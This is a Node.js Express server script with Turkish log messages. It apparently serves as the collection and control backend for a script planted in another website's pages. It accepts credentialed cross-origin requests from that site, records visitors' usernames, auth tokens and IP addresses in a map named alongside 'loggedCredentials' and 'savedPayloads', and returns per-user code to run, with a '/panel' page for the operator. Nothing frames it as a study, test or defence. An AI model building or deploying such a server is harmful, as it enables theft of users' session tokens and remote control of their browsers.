const express = require('express');
const http = require('http');
const path = require('path');

const app = express();
const server = http.createServer(app);

const connectedClients = new Map();
const userCodes = new Map();
const savedPayloads = new Map();
const loggedCredentials = new Map();

app.use(express.json());
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', 'https://katiponline.com');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    res.header('Access-Control-Allow-Credentials', 'true');
    next();
});
app.use(express.static('public'));

app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

app.get('/hello', (req, res) => {
    res.send('Merhaba, sunucu çalışıyor!');
});

app.post('/get-code', (req, res) => {
    console.log('POST /get-code isteği alındı:', req.body); // Hata ayıklama
    const { username, authToken } = req.body || {};
    const ipAddress = req.ip || req.connection.remoteAddress;

    if (!username || !authToken) {
        console.log('Eksik veri:', { username, authToken });
        return res.status(400).json({ error: 'Username ve authToken gerekli' });
    }

    connectedClients.set(username, {
        username,
        authToken,
        ipAddress,
        lastSeen: Date.now()
    });

    const userCode = userCodes.get(username) || { code: '', timestamp: Date.now() };
    res.json(userCode);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Sunucu ${PORT} portunda çalışıyor`);
});

// Hata yakalama
server.on('error', (err) => {
    console.error('Sunucu hatası:', err);
});
